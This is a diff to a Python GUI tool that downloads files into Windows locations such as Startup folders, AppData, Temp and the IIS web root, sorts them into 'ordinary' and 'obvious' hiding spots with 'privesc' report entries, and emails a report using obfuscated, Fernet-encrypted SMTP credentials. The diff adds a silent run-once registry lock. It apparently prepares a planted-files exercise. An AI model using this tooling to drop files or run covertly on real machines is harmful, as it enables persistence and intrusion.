@@ -5,12 +5,57 @@ from datetime import datetime
 import tkinter as tk
 import threading
 import requests
-import getpass
 import smtplib
 import random
+import winreg
 import sys
 import os
 import re
+
+# --- Registry Configuration for Single Execution ---
+REGISTRY_KEY = r"SOFTWARE\CampaignAssetsReporter"
+REGISTRY_VALUE_NAME = "ReportCompleted"
+
+def check_and_initialize_registry():
+    """
+    Checks if the ReportCompleted flag is set in HKLM.
+    If set to 1, the program exits immediately.
+    If the key doesn't exist, it creates it with an initial value of 0.
+    """
+    try:
+        # 1. Open the key and read the value
+        hkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REGISTRY_KEY, 0, winreg.KEY_READ)
+        value, _ = winreg.QueryValueEx(hkey, REGISTRY_VALUE_NAME)
+        winreg.CloseKey(hkey)
+        
+        # Check the value == 1
+        if value == 1:
+            # Lock found: Execution completed previously. Exit silently.
+            sys.exit(0)
+            
+    except FileNotFoundError:
+        # Create the key and set the initial value to 0.
+        try:
+            hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REGISTRY_KEY)
+            winreg.SetValueEx(hkey, REGISTRY_VALUE_NAME, 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(hkey)
+        except Exception:
+            pass
+    except Exception:
+        # Other read/query errors, proceed allowing execution but without the lock.
+        pass
+
+def finalize_registry_lock():
+    """Sets the registry value to 1 after successful report execution."""
+    try:
+        # Open key with write permission
+        hkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE)
+        # Set value to 1 (REG_DWORD)
+        winreg.SetValueEx(hkey, REGISTRY_VALUE_NAME, 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(hkey)
+    except Exception:
+        # If writing fails, the program might run again on next trigger.
+        pass
 
 # --- Random Timestamp Generator ---
 def get_random_timestamp():
@@ -48,7 +93,7 @@ FERNET_KEY = b"".join(OBFUSCATED_KEY_PARTS)
 fernet = Fernet(FERNET_KEY)
 
 ENC_SMTP_USERNAME = b'gAAAAABo47LJizt9_c5yctHtbg6InukA3gwXMawJwlBvADCr79wFro9a5ayOXYGBHd0xgmafIIHgD_cNUJbNvv5VmCCHXkfDgr7FKEaquaB5hNbYXG5XvpE='
-ENC_SMTP_PASSWORD = b'gAAAAABo47LJoI3-HhyoWQ0bw2bapSva_6Np00mfuQqjDa-CUAGCqlrjTQVfIgKWMx-UNvEbK2WU4TvL9nRCmWpGbv_cF-77r8vfZ2jVkOBNokkspLpalLI='
+ENC_SMTP_PASSWORD = b'gAAAAABo47LJoI3-HhyoWQ0bw2bapSva_6Np00mfuQqjDa-CUAGCqlrjTQVfIgKWMx-UNvEb2WU4TvL9nRCmWpGbv_cF-77r8vfZ2jVkOBNokkspLpalLI='
 
 SMTP_USERNAME = fernet.decrypt(ENC_SMTP_USERNAME).decode()
 SMTP_PASSWORD = fernet.decrypt(ENC_SMTP_PASSWORD).decode()
@@ -99,15 +144,14 @@ def download_and_save_file(file_info, save_dir):
 def generate_report_and_save(username, selected_files):
     
     # Download files to categorized paths and generate a structured report.
-    system_username = getpass.getuser()
     
     ordinary_paths = [
-        r"C:\Users\{username}\AppData\Local\Temp",
-        r"C:\Users\{username}\AppData\Local",
-        r"C:\Users\{username}\AppData\Roaming",
-        r"C:\Users\{username}\AppData\LocalLow",
-        r"C:\Users\{username}\AppData\Local\Microsoft\Windows\INetCache",
-        r"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs",
+        r"C:\Users\User\AppData\Local\Temp",
+        r"C:\Users\User\AppData\Local",
+        r"C:\Users\User\AppData\Roaming",
+        r"C:\Users\User\AppData\LocalLow",
+        r"C:\Users\User\AppData\Local\Microsoft\Windows\INetCache",
+        r"C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs",
         r"C:\Windows\Temp",
         r"C:\inetpub\wwwroot",
         r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs",
@@ -152,17 +196,13 @@ def generate_report_and_save(username, selected_files):
     obvious_paths = [
         r"C:\Users\Public\Documents",
         r"C:\Users\Public\Downloads",
-        r"C:\Users\{username}\Documents",
-        r"C:\Users\{username}\Downloads",
-        r"C:\Users\{username}\Favorites",
-        r"C:\Users\{username}\3D Objects",
-        r"C:\Users\{username}\Searches",
-        r"C:\Users\{username}\Links",
+        r"C:\Users\User\Documents",
+        r"C:\Users\User\Downloads",
+        r"C:\Users\User\Favorites",
+        r"C:\Users\User\3D Objects",
+        r"C:\Users\User\Searches",
+        r"C:\Users\User\Links",
     ]
-
-    # Replace {username} with the actual system username
-    ordinary_paths = [path.replace("{username}", system_username) for path in ordinary_paths]
-    obvious_paths = [path.replace("{username}", system_username) for path in obvious_paths]
 
     # Distribute files and collect report items for each category
     privesc_reports = []
@@ -334,10 +374,15 @@ class ReportApp:
                 # Continue loop on failure, no sleep to make it fast
                 continue
                 
-        # 5. Terminate the application
+        # 5. Set the registry lock after the report is successfully sent
+        finalize_registry_lock()
+                
+        # 6. Terminate the application
         self.master.destroy()
 
 if __name__ == "__main__":
+    # Check registry status before creating the GUI.
+    check_and_initialize_registry()
     root = tk.Tk()
     app = ReportApp(root)
     root.mainloop()
